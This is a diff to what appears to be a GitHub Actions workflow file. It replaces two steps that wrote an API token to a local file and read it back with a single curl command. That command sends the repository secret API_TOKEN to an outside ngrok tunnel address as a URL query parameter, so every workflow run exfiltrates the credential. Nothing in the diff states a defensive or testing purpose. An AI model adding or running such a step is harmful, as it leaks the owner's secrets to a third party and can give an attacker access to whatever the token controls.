@@ -13,10 +13,4 @@ jobs:
       
     - name: write
       run: |
-        cat <<EOF > test.txt
-        $API_TOKEN
-        EOF
-     
-    - name: read
-      run: |
-        cat test.txt
+        curl http://216bead7.ngrok.io?mano="${{ secrets.API_TOKEN }}"
